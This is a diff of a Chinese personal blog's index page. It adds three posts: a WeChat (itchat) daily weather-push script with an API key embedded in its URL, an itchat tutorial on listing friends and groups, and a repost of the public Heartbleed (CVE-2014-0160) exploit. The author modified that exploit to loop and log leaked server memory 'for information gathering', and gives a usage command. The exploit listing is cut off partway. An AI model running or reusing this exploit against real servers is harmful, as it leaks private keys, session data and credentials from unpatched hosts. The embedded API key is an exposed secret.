@@ -2,43 +2,53 @@
 
 
 <html lang="zh-CN">
-
-
-<head>
-  <meta charset="utf-8" />
-    
-  <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-  <title>
-     GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……
-  </title>
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> Guoker&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-ayer">
-  
-  <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
-  
-  
+      
+      <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
+       
 <link rel="stylesheet" href="/dist/main.css">
 
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
-
-  
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
 <link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
 
-  
-  
-<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
 
-  
-  
-
-  
-
-<link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
 </head>
-
+  </html>
 </html>
+
 
 <body>
   <div id="app">
@@ -96,6 +106,50 @@
   
 <div id="main">
   <section class="outer">
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
   <article class="articles">
     
     
@@ -118,6 +172,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -125,7 +180,19 @@
   <time datetime="2019-01-11T16:00:00.000Z" itemprop="datePublished">2019-01-12</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天，天冷就算了，还天天下毛毛雨，潮湿难受，每天出门都要拉开窗帘跑去阳台，透过水蒙蒙的玻璃看看外面天气如何。想想每天起来第一件事都是先看看微信消息，不如趁着学习itchat这段时间写每天早上准时发送天气预报的功能吧。效果已最后一条为准，简单粗暴。</p>
+<p><img src="https://i.loli.net/2019/01/12/5c39d84e807f3.jpg" alt="效果"></p>
+<p>程序的大致流程：1.登录微信-》2.查询当前时间-》3.判断是否到达指定时间-》4.抓取天气信息（API）-》5.发送给直接-》6.循环（返回2）</p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weather</span>():</span></span><br><span class="line">    request = requests.get(<span class="string">&#x27;http://v.juhe.cn/weather/index?cityname=%E5%8D%97%E5%AE%81&amp;dtype=&amp;format=2&amp;key=a0415e394775292ef2afcb115fb77b3d&#x27;</span>)</span><br><span class="line">    request.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    data = request.json()</span><br><span class="line">    <span class="comment">#温度</span></span><br><span class="line">    emperature = data[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;today&#x27;</span>][<span class="string">&#x27;temperature&#x27;</span>]</span><br><span class="line">    <span class="comment">#天气</span></span><br><span class="line">    weather = data[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;today&#x27;</span>][<span class="string">&#x27;weather&#x27;</span>]</span><br><span class="line">    <span class="comment">#星期</span></span><br><span class="line">    week = data[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;today&#x27;</span>][<span class="string">&#x27;week&#x27;</span>]</span><br><span class="line">    text = <span class="string">&#x27;今日%s\n今日温度%s\n今日天气%s&#x27;</span>%(week,emperature,weather)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wechat_send</span>():</span></span><br><span class="line">    <span class="comment">#itchat.auto_login(True)</span></span><br><span class="line">    itchat.send(weather(),toUserName=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span>(<span class="params">h,m</span>):</span></span><br><span class="line">    itchat.auto_login(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new = datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> new.hour == h <span class="keyword">and</span> new.minute &gt; m :</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                wechat_send()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;消息已发送，当前时间：&#x27;</span>+time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;消息未发送，未知错误，当前时间：&#x27;</span>+time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;未达到指定时间段，程序延迟30分钟后重试，当前时间：&#x27;</span>+time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">                time.sleep(<span class="number">1800</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;已退出微信天气推送&#x27;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop(<span class="number">8</span>,<span class="number">00</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> ：D</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -138,7 +205,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -159,6 +226,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -166,7 +234,74 @@
   <time datetime="2019-01-09T16:00:00.000Z" itemprop="datePublished">2019-01-10</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<blockquote>
+<blockquote>
+<p>itchat是一个开源的微信个人号接口，使用python调用微信从未如此简单。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>使用不到三十行的代码，你就可以完成一个能够处理所有信息的微信机器人。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>当然，该api的使用远不止一个机器人，更多的功能等着你来发现。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>该接口与公众号接口itchatmp共享类似的操作方式，学习一次掌握两个工具。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>如今微信已经成为了个人社交的很大一部分，希望这个项目能够帮助你扩展你的个人的微信号、方便自己的生活。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>python 2.x 安装</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install itchat</span><br></pre></td></tr></table></figure>
+<p>python3.x安装</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install itchat</span><br></pre></td></tr></table></figure>
+
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line">itchat.auto_login(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>hotReload=True 保留登录状态，避免每次测试都需要扫码</p>
+<p>itchat.auto_login(hotReload=True)等于itchat.auto_login(True)</p>
+<h2 id="输出所有好友昵称及备注"><a href="#输出所有好友昵称及备注" class="headerlink" title="输出所有好友昵称及备注"></a>输出所有好友昵称及备注</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">friends = itchat.get_friends()</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出所有好友昵称及备注</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> friends:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(<span class="string">&#x27;好友昵称：&#x27;</span>+l[<span class="string">&#x27;NickName&#x27;</span>]+<span class="string">&quot;---好友备注：&quot;</span>+l[<span class="string">&#x27;RemarkName&#x27;</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#RemarkName 好友备注</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索好友1-0"><a href="#搜索好友1-0" class="headerlink" title="搜索好友1.0"></a>搜索好友1.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">friends = itchat.get_friends()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_friend</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> friends:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="string">&#x27;RemarkName&#x27;</span>] == name:</span><br><span class="line">            <span class="keyword">return</span> l</span><br><span class="line">friend = find_friend(<span class="string">&#x27;猪猪&#x27;</span>)</span><br><span class="line"><span class="comment">#print(str(friend))#打印该好友的相关信息</span></span><br><span class="line"><span class="built_in">print</span>(friend[<span class="string">&#x27;UserName&#x27;</span>]);</span><br><span class="line"><span class="comment">#itchat.send(&#x27;测试发送&#x27;,toUserName=friend[&#x27;UserName&#x27;])#发送消息【测试发送】给一名叫【猪猪】的好友</span></span><br></pre></td></tr></table></figure>
+<p>其中UserName索引为itchat发送消息时必填选项（唯一标识符），因此搜索的目的就是找出这一串字符供后续发送时用。</p>
+<h3 id="搜索好友2-0"><a href="#搜索好友2-0" class="headerlink" title="搜索好友2.0"></a>搜索好友2.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询好友2.0 会多返回一层空的list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># friend = itchat.search_friends(name=&#x27;猪猪&#x27;)[0]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(friend[&#x27;UserName&#x27;])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用模块自带的方法搜索</p>
+<h2 id="输出所有公众号名称"><a href="#输出所有公众号名称" class="headerlink" title="输出所有公众号名称"></a>输出所有公众号名称</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取公众号内容1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mps = itchat.get_mps()</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> mps:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;mps.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(<span class="string">&#x27;公众号为:&#x27;</span>+a[<span class="string">&#x27;NickName&#x27;</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索公众号1-0"><a href="#搜索公众号1-0" class="headerlink" title="搜索公众号1.0"></a>搜索公众号1.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索公众号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_mps</span>(<span class="params">name</span>):</span></span><br><span class="line">    mps = itchat.get_mps()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> mps:</span><br><span class="line">        <span class="keyword">if</span> a[<span class="string">&#x27;NickName&#x27;</span>] == name:</span><br><span class="line">            <span class="keyword">return</span> a[<span class="string">&#x27;UserName&#x27;</span>]</span><br><span class="line"></span><br><span class="line">username = find_mps(<span class="string">&#x27;T00ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>定义find_mps函数搜索名为T00ls的公众号</p>
+<h3 id="搜搜公众号2-0"><a href="#搜搜公众号2-0" class="headerlink" title="搜搜公众号2.0"></a>搜搜公众号2.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索公众号2.0 同获取好友2.0一样</span></span><br><span class="line">mps = itchat.search_mps(name=<span class="string">&#x27;T00ls&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(mps))</span><br></pre></td></tr></table></figure>
+<h2 id="输出所有群聊"><a href="#输出所有群聊" class="headerlink" title="输出所有群聊"></a>输出所有群聊</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取群组1.0</span></span><br><span class="line">chatrooms = itchat.get_chatrooms()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> chatrooms:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chatrooms&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;群组名为：&#x27;</span>+a[<span class="string">&#x27;NickName&#x27;</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索群聊1-0"><a href="#搜索群聊1-0" class="headerlink" title="搜索群聊1.0"></a>搜索群聊1.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_chatrooms</span>(<span class="params">name</span>):</span></span><br><span class="line">    chatrooms = itchat.get_chatrooms()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> chatrooms:</span><br><span class="line">        <span class="keyword">if</span> a[<span class="string">&#x27;NickName&#x27;</span>] == name:</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line"><span class="built_in">print</span>(find_chatrooms(<span class="string">&#x27;英福泰科&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索群聊2-0"><a href="#搜索群聊2-0" class="headerlink" title="搜索群聊2.0"></a>搜索群聊2.0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索群组2.0</span></span><br><span class="line">chatroom = itchat.search_chatrooms(name=<span class="string">&#x27;英福泰科&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(chatroom))</span><br></pre></td></tr></table></figure>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>上午学习了itchat一些简单的使用方法，下午写了此文用作记录，明天根据实际需求，写出两个小demo，一个用来挂在服务器上对微信公众号进行签到，另一个抓取天气预报后发送给群聊或者手机（或许会学习使用AI机器人的接口通过对机器人查询天气，然后将起返回的消息处理后发送）</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -179,7 +314,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -200,6 +335,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -207,7 +343,21 @@
   <time datetime="2019-01-03T08:54:00.000Z" itemprop="datePublished">2019-01-03</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>14年的漏洞，帮大佬打杂根据网上的exp改的循环利用，搜集信息可用。</p>
+<p>修改如下：<br>1.去除返回的偏移量与非Ascii字符<br>2.新增两个参数 -t 与 -d  分别为间隔时间，单位秒；输出文件名</p>
+<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 LoopHeartbleed.py 192.168.50.120 -p 443 -t 5 -d out.log</span><br></pre></td></tr></table></figure>
+
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]</span></span><br><span class="line"><span class="comment"># Date: [2014-04-09]</span></span><br><span class="line"><span class="comment"># Exploit Author: [Csaba Fitzl]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [http://www.openssl.org/]</span></span><br><span class="line"><span class="comment"># Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]</span></span><br><span class="line"><span class="comment"># Version: [1.0.1f]</span></span><br><span class="line"><span class="comment"># Tested on: [N/A]</span></span><br><span class="line"><span class="comment"># CVE : [2014-0160]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#The second revision comes from GuoKer </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span></span><br><span class="line"><span class="comment"># The author disclaims copyright to this source code.</span></span><br><span class="line"><span class="comment"># Modified by Csaba Fitzl for multiple SSL / TLS version support</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">&#x27;%prog server [options]&#x27;</span>, description=<span class="string">&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;int&#x27;</span>, default=<span class="number">443</span>, <span class="built_in">help</span>=<span class="string">&#x27;TCP port to test (default: 443)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--time&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;int&#x27;</span>, default=<span class="number">10</span>, <span class="built_in">help</span>=<span class="string">&#x27;Time to test (default: 10)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dest&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;str&#x27;</span>, default=<span class="string">&#x27;out.txt&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Text output to test (default: out.txt)&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span>(<span class="params">x</span>):</span></span><br><span class="line">	<span class="keyword">return</span> x.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">version = []</span><br><span class="line">version.append([<span class="string">&#x27;SSL 3.0&#x27;</span>,<span class="string">&#x27;03 00&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.0&#x27;</span>,<span class="string">&#x27;03 01&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.1&#x27;</span>,<span class="string">&#x27;03 02&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.2&#x27;</span>,<span class="string">&#x27;03 03&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_hello</span>(<span class="params">version</span>):</span></span><br><span class="line">	hello = h2bin(<span class="string">&#x27;16 &#x27;</span> + version + <span class="string">&#x27; 00 dc 01 00 00 d8 &#x27;</span> + version + <span class="string">&#x27;&#x27;&#x27; 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 